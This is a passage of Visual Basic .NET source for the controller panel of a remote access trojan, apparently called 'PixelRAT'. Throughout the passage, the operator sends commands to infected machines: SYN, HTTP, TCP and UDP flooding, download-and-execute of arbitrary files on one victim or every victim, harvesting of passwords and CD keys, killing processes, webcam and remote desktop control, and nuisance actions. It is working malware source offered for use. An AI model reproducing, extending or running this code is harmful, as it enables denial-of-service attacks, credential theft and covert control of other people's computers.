                Plague("KILLPROC|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|" & proc)
            Catch ex As Exception

            End Try
        Next
    End Sub

    Private Sub KillAllToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KillAllToolStripMenuItem.Click
        Try
            Plague("KILLPROC|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|" & "all")
        Catch ex As Exception

        End Try
    End Sub

    Private Sub MButtonnone5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone5.Click
        Try
            Plague("KILLPROC|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|" & "all")
        Catch ex As Exception

        End Try
    End Sub

    Private Sub MButtonnone9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone9.Click
        Try
            Plague("GETPROC|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
        Catch ex As Exception

        End Try
    End Sub


    Private Sub LoadDeviceList()
        Dim strName As String = Space(100)
        Dim strVer As String = Space(100)
        Dim bReturn As Boolean
        Dim x As Integer = 0

        ' 
        ' Load name of all avialable devices into the lstDevices
        '

        Do
            '
            '   Get Driver name and version
            '
            bReturn = capGetDriverDescriptionA(x, strName, 100, strVer, 100)

            '
            ' If there was a device add device name to the list
            '
            If bReturn Then lstDevices.Items.Add(strName.Trim)
            x += 1
        Loop Until bReturn = False
    End Sub
    Private Sub OpenPreviewWindow()
        Dim iHeight As Integer = picCapture.Height
        Dim iWidth As Integer = picCapture.Width

        '
        ' Open Preview window in picturebox
        '
        hHwnd = capCreateCaptureWindowA(iDevice, WS_VISIBLE Or WS_CHILD, 0, 0, 640, _
            480, picCapture.Handle.ToInt32, 0)

        '
        ' Connect to device
        '
        If SendMessage(hHwnd, WM_CAP_DRIVER_CONNECT, iDevice, 0) Then
            '
            'Set the preview scale
            '
            SendMessage(hHwnd, WM_CAP_SET_SCALE, 1, 0)

            '
            'Set the preview rate in milliseconds
            '
            SendMessage(hHwnd, WM_CAP_SET_PREVIEWRATE, 66, 0)

            '
            'Start previewing the image from the camera
            '
            SendMessage(hHwnd, WM_CAP_SET_PREVIEW, 1, 0)

            '
            ' Resize window to fit in picturebox
            '
            SetWindowPos(hHwnd, HWND_BOTTOM, 0, 0, picCapture.Width, picCapture.Height, _
                    SWP_NOMOVE Or SWP_NOZORDER)



        Else
            '
            ' Error connecting to device close window
            ' 
            DestroyWindow(hHwnd)

        End If
    End Sub

    Private Sub btnStart_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        iDevice = lstDevices.SelectedIndex
        OpenPreviewWindow()
    End Sub

    Private Sub ClosePreviewWindow()
        '
        ' Disconnect from device
        '
        SendMessage(hHwnd, WM_CAP_DRIVER_DISCONNECT, iDevice, 0)

        '
        ' close window
        '

        DestroyWindow(hHwnd)
    End Sub






    Private Sub Timer13_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer13.Tick

        ' Timer13.Stop()
        ' Timer12.Start()
    End Sub

    Private Sub btnStop_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub MButtonnone10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone10.Click
        hidethat("ConnectionPanel", ConnectionPanel)

        If isdesktop = 1 Then
            RichTextBox5.Text += "[" & TimeOfDay & "]" & " Stopping..." & vbNewLine
            RichTextBox5.SelectionStart = RichTextBox5.TextLength
            RichTextBox5.ScrollToCaret()
            Try
                Plague("WEBCAM|STOP|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                System.Threading.Thread.Sleep(1000)
                Plague("REMOTE|STOP|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Successfully stopped." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
                isdesktop = 0
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try



        End If
        isdesktop = 4
    End Sub


    Private Sub TextBox4_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox4.TextChanged

    End Sub
    Private Sub Label16_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label20.Click

    End Sub

    Private Sub MButton5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton5.Click
        If CheckBox5.Checked = True Then
            If MButton5.Text = "GO" Then
                MButton5.Text = "STOP"
                If TrackBar2.Value = 3 Then
                    Try
                        Plague("SYN|" + TextBox3.Text + " " + TextBox4.Text + " " + TextBox9.Text + " " + TextBox10.Text)
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " SYN Flooding started." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    Catch ex As Exception
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    End Try

                End If
                If TrackBar2.Value = 1 Then
                    Try
                        Plague("HTTP|" + TextBox3.Text + " " + TextBox7.Text + " " + TextBox9.Text)
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " HTTP Flooding started." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    Catch ex As Exception
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    End Try

                End If
                If TrackBar2.Value = 4 Then
                    Try
                        Plague("TCP|" + TextBox3.Text + " " + TextBox4.Text + " " + TextBox7.Text + " " + TextBox9.Text)
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " TCP Flooding started." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    Catch ex As Exception
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    End Try

                End If
                If TrackBar2.Value = 0 Then
                    Try
                        Plague("UDP|" + TextBox3.Text + " " + TextBox4.Text + " " + TextBox9.Text + " " + TextBox10.Text)
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " UDP Flooding started." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    Catch ex As Exception
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    End Try

                End If
            Else

                If TrackBar2.Value = 3 Then
                    Try
                        Plague("SYN|STOP")
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " SYN Flooding stopped." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    Catch ex As Exception
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    End Try

                End If
                If TrackBar2.Value = 1 Then
                    Try
                        Plague("HTTP|STOP" + TextBox3.Text + " " + TextBox7.Text + " " + TextBox9.Text)
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " HTTP Flooding stopped." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    Catch ex As Exception
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    End Try

                End If
                If TrackBar2.Value = 4 Then
                    Try
                        Plague("TCP|STOP" + TextBox3.Text + " " + TextBox4.Text + " " + TextBox7.Text + " " + TextBox9.Text)
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " TCP Flooding stopped." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    Catch ex As Exception
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    End Try

                End If
                If TrackBar2.Value = 0 Then
                    Try
                        Plague("UDP|STOP" + TextBox3.Text + " " + TextBox4.Text + " " + TextBox9.Text + " " + TextBox10.Text)
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " UDP Flooding stopped." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    Catch ex As Exception
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    End Try

                End If
                MButton5.Text = "GO"
            End If
        Else
            MessageBox.Show("You must click I Agree and accept the disclaimer in order to use this function", "Attention!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
        End If

    End Sub

    Private Sub MButtonnone11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone11.Click
        Dim hostname As IPHostEntry = Dns.GetHostByName(TextBox11.Text)
        Dim ip As IPAddress() = hostname.AddressList
        TextBox13.Text = ip(0).ToString()

    End Sub

    Private Sub StartDDoSToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartDDoSToolStripMenuItem.Click
        hidethat("DOSPanel", DOSPanel)
    End Sub

    Private Sub CheckBox4_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox4.CheckedChanged
        If CheckBox4.Checked = True Then
            CheckBox3.Checked = False
            CheckBox5.Checked = False
        End If
    End Sub

    Private Sub CheckBox5_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox5.CheckedChanged
        If CheckBox5.Checked = True Then
            CheckBox3.Checked = False
            CheckBox4.Checked = False
        End If
    End Sub

    Private Sub CheckBox3_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            CheckBox4.Checked = False
            CheckBox5.Checked = False
        End If
    End Sub

    Private Sub MButtonnone12_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone12.Click
        Form2.Show()
    End Sub

    Private Sub VisitWebsiteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VisitWebsiteToolStripMenuItem.Click

    End Sub

    Private Sub SingleWebsiteVisitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SingleWebsiteVisitToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget
        Next
        hidethat("WebPanel", WebPanel)
        RadioButton1.Checked = True
        RadioButton2.Checked = False
        RadioButton3.Checked = False
        RadioButton4.Checked = False

    End Sub

    Private Sub MassToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MassToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget
        Next
        hidethat("WebPanel", WebPanel)
        RadioButton1.Checked = False
        RadioButton2.Checked = True
        RadioButton3.Checked = False
        RadioButton4.Checked = False
    End Sub

    Private Sub RemoteDownloadExecuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteDownloadExecuteToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget
        Next
        hidethat("WebPanel", WebPanel)
        RadioButton1.Checked = False
        RadioButton2.Checked = False
        RadioButton3.Checked = False
        RadioButton4.Checked = True
    End Sub

    Private Sub MButtonnone13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone13.Click
        Dim silent As String
        If CheckBox6.Checked = True Then
            silent = "YES"
        Else
            silent = "NO"
        End If
        If RadioButton1.Checked = True Then
            Try
                Plague("VISIT|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|" & TextBox15.Text & "|" & silent)
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " " & TextBox15.Text & " is being visited." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()

            End Try
        Else
            Try
                Plague("VISIT|" & "ALL" & "|" & TextBox15.Text & "|" & silent)
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " " & TextBox15.Text & " is being visited by all." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try
        End If

    End Sub

    Private Sub RadioButton1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton1.CheckedChanged
        If RadioButton1.Checked = True Then
            RadioButton2.Checked = False
        End If
    End Sub

    Private Sub RadioButton2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton2.CheckedChanged
        If RadioButton2.Checked = True Then
            RadioButton1.Checked = False
        End If
    End Sub

    Private Sub MButtonnone14_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone14.Click

        If RadioButton4.Checked = True Then
            Try
                Plague("DLEXE|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|" & TextBox18.Text & "|" & TextBox19.Text & "|")
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " The file" & TextBox18.Text & " is being downloaded and executed." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try
        Else
            Try
                Plague("DLEXE|" & "ALL" & "|" & TextBox18.Text & "|" & TextBox19.Text & "|")
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " The file" & TextBox18.Text & " is being downloaded and executed by all." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try
        End If
    End Sub

    Private Sub RadioButton4_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton4.CheckedChanged
        If RadioButton4.Checked = True Then
            RadioButton3.Checked = False

        End If
    End Sub

    Private Sub RadioButton3_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton3.CheckedChanged
        If RadioButton3.Checked = True Then
            RadioButton4.Checked = False
        End If

    End Sub


    Private Sub GetToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetToolStripMenuItem.Click
        mRtBlmqVtIpyjspKbFfehzvZovudfg = "PWD"


        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")

            dnsget = dataarray2(0)
            id = dnsget
            COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget
        Next
        Try
            Plague("GETPASS|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|PWD")
            MButtonnone16.Text = "Stop"
            RichTextBox2.Clear()
            RichTextBox5.Text += "[" & TimeOfDay & "]" & " Gathering Passwords..." & vbNewLine
            RichTextBox5.SelectionStart = RichTextBox5.TextLength
            RichTextBox5.ScrollToCaret()
            hidethat("PasswordPanel", PasswordPanel)
        Catch ex As Exception
            RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
            RichTextBox5.SelectionStart = RichTextBox5.TextLength
            RichTextBox5.ScrollToCaret()
        End Try
        '  hidethat("WebPanel", WebPanel)





    End Sub


    Private Sub MButtonnone16_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone16.Click




        If MButtonnone16.Text = "Get Passwords" Then

            RichTextBox2.Clear()
            Try
                Plague("GETPASS|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|PWD")
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Passwords" & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()

            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try
            MButtonnone16.Text = "Stop"
        Else
            If MButtonnone16.Text = "Stop" Then
                Try
                    'Broadcast("GETPASS|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                    Plague("STOPPASS|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                    MProgress2.Current = 0
                    RichTextBox5.Text += "[" & TimeOfDay & "]" & " Stopping command." & vbNewLine
                    RichTextBox5.SelectionStart = RichTextBox5.TextLength
                    RichTextBox5.ScrollToCaret()
                Catch ex As Exception
                    RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
                    RichTextBox5.SelectionStart = RichTextBox5.TextLength
                    RichTextBox5.ScrollToCaret()
                End Try
                '  hidethat("WebPanel", WebPanel)
                If mRtBlmqVtIpyjspKbFfehzvZovudfg = "CD" Then
                    MButtonnone16.Text = "Get CD Keys"

                End If
                If mRtBlmqVtIpyjspKbFfehzvZovudfg = "PWD" Then
                    MButtonnone16.Text = "Get Passwords"
                End If
            Else
                If MButtonnone16.Text = "Get CD Keys" Then
                    RichTextBox2.Clear()
                    Try
                        Plague("GETPASS|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|CD")
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Gathering CD Keys..." & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()

                    Catch ex As Exception
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    End Try

                    MButtonnone16.Text = "Stop"
                Else

                End If
            End If
        End If











    End Sub

    Private Sub MButtonnone18_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone18.Click


        MsgBox("Starting listener with user-defined settings")
        '   TextBox1.Enabled = False
        '    btnListen.Enabled = False 'Disable clicking of this button.

        listenerThread = New Threading.Thread(AddressOf DoListen)
        listenerThread.Start()
        islisten = 1
        MButtonnone3.Enabled = False
        Me.Width = 710
        Me.Height = 522
        hidethat("ConnectionPanel", ConnectionPanel)
        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Listening on Ports " & TextBox1.Text & " and " & TextPort.Text & vbNewLine
        RichTextBox5.SelectionStart = RichTextBox5.TextLength
        RichTextBox5.ScrollToCaret()
    End Sub

    Private Sub MButtonnone17_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone17.Click
        If System.IO.File.Exists(Application.StartupPath & "\PixelRAT.config") = True Then
        Else
            My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\PixelRAT.config", My.Resources.String1, False)
        End If

        FileNameWithoutExtension(Application.ExecutablePath)
        If CheckBox7.Checked = True Then
            WriteSetting("NOTIFY", "YES")
        Else
            WriteSetting("NOTIFY", "NO")
        End If
        WriteSetting("FIRSTTIME", "NO")
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Listen.ini", TextBox1.Text & "|", True)
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Listen.ini", TextPort.Text & "|", True)
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Listen.ini", CheckBox7.Checked & "|", True)
        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Saved port settings" & vbNewLine
        RichTextBox5.SelectionStart = RichTextBox5.TextLength
        RichTextBox5.ScrollToCaret()
    End Sub

    Private Sub Listhead8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub


    Private Sub MButton6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton6.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub MButton7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton7.Click
        'First minimize the form
        Me.WindowState = FormWindowState.Minimized

        'Now make it invisible (make it look like it went into the system tray)
        Me.Visible = False

        'Cancel the closing of the application
        '  e.Cancel = True

        NotifyIcon1.Visible = True
        NotifyIcon1.BalloonTipText = ("PixelRat has been minimized to the task bar.")
        NotifyIcon1.ShowBalloonTip(1000)


    End Sub
    Private Sub MButton7_mouseenter(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton7.MouseEnter

    End Sub
    Private Sub MButton7_mouseleave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton7.Leave

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)


    End Sub

    Private Sub MButtonnone15_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone15.Click
        Dim saveFileDialog1 As New SaveFileDialog()

        saveFileDialog1.Filter = "Text Files (*.txt)|*.txt"
        saveFileDialog1.FilterIndex = 2
        saveFileDialog1.RestoreDirectory = True
        saveFileDialog1.Title = "Choose a directory to save the passwords"
        saveFileDialog1.FileName = "Passwords PixelRat"

        If saveFileDialog1.ShowDialog() = DialogResult.OK Then


            My.Computer.FileSystem.WriteAllText(saveFileDialog1.FileName, RichTextBox2.Text, False)

        End If

    End Sub

    Private Sub Timer14_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer14.Tick
        Dim lines As Integer = RichTextBox2.Lines.Length
        For i = 0 To lines

            If jppwyaviqMfVwHvxeDtbnnBflzjylu = "YES" Then
                sendback("PASSWORDS|" & RichTextBox2.Lines(i).ToString)
                System.Threading.Thread.Sleep(200)
            End If

        Next i

    End Sub

    Private Sub MButton4_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub SendMessageToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendMessageToolStripMenuItem.Click

        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget
        Next
        hidethat("Panel1", Panel1)
    End Sub

    Private Sub MButtonnone19_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone19.Click
        Dim messageboxicon As String
        If RadioButton5.Checked = True Then
            messageboxicon = "1"
        End If
        If RadioButton6.Checked = True Then
            messageboxicon = "2"
        End If
        If RadioButton7.Checked = True Then
            messageboxicon = "3"
        End If
        If RadioButton8.Checked = True Then
            messageboxicon = "4"
        End If
        Dim messageboxbtn As String



        Try
            If CheckBox10.Checked = False And CheckBox9.Checked = False Then
                MsgBox("Select the Recipients of Message")
            End If
            If CheckBox9.Checked = True Then
                Plague("MSG|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|" & TextBox16.Text & "|" & TextBox17.Text & "|" & messageboxicon)
                ' MButtonnone16.Text = "STOP"
            End If
            If CheckBox10.Checked = True Then
                Plague("MSG|" & "EVERY" & "|" & TextBox16.Text & "|" & TextBox17.Text & "|" & messageboxicon)
                ' MButtonnone16.Text = "STOP"
            End If

        Catch ex As Exception

        End Try
    End Sub


    Private Sub NotifyIcon1_MouseDoubleClick(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick
        Me.Show()
        Me.WindowState = FormWindowState.Normal
    End Sub

    Private Sub OpenToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenToolStripMenuItem.Click
        Me.Show()
        Me.WindowState = FormWindowState.Normal
        Me.Focus()
    End Sub

    Private Sub DisconnectAllToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisconnectAllToolStripMenuItem.Click
        If islisten = 0 Then
            sendback("DISCONNECT|")


        Else

            Try
                Plague("DISCONNECT|")
                MTheme1.Text = "PixelRAT :: No users online"
                Label3.Text = "No users online"
            Catch ex As Exception
            End Try

            Try
                listener.Stop()
            Catch ex As Exception
            End Try
        End If

        Icount = 0
        ListView1.Clear()
    End Sub

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        Application.Exit()
    End Sub

    Private Sub FunPanel50OptionsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FunPanel50OptionsToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget
        Next



        hidethat("FunPanel", FunPanel)
    End Sub

    Private Sub MButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton3.Click
        hidethat("BuildPanel", BuildPanel)
        MProgress3.Current = 0
        Label44.Text = "Waiting for user input..."

        Me.Height = 522
        Me.Width = 710
    End Sub

    Private Sub MButton11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton11.Click
        Me.Height = 522
        Me.Width = 710

        COdSkicmIdkPhgathsyfWfxaNhgdlk = "EVERY"
        hidethat("FunPanel", FunPanel)
    End Sub

    Private Sub Mbuttonnone2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Mbuttonnone2.Click
        Form4.Show()
    End Sub

    Private Sub MButtonnone20_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone20.Click
        Try
            If MButtonnone20.Text = "Hide Mouse" Then
                Plague("DISABLEMOUSE|1|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                MButtonnone20.Text = "Show Mouse"
            Else
                Plague("DISABLEMOUSE|0|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                MButtonnone20.Text = "Hide Mouse"
            End If
        Catch ex As Exception
        End Try
    End Sub


    Private Sub MButtonnone21_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone21.Click
        Try
            If MButtonnone21.Text = "Swap Mouse Buttons" Then
                Plague("SWAPMOUSE|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                MButtonnone21.Text = "Reset Mouse Button"
            Else
                Plague("SWAPMOUSE|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                MButtonnone21.Text = "Swap Mouse Buttons"
            End If
        Catch ex As Exception
        End Try

    End Sub

    Private Sub MButtonnone22_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone22.Click
        Try
            If MButtonnone22.Text = "Open CD Drive" Then
                Plague("OPENCD|1|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                MButtonnone22.Text = "Close CD Drive"
            Else
                Plague("OPENCD|0|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                MButtonnone22.Text = "Open CD Drive"
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub MButtonnone27_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone27.Click
        Try

            Plague("BEEP|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
            '  MButtonnone27.Text = "Close CD Drive"

        Catch ex As Exception
        End Try
    End Sub

    Private Sub MButtonnone24_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone24.Click
        Try
            If MButtonnone24.Text = "Hide Desktop Icons" Then
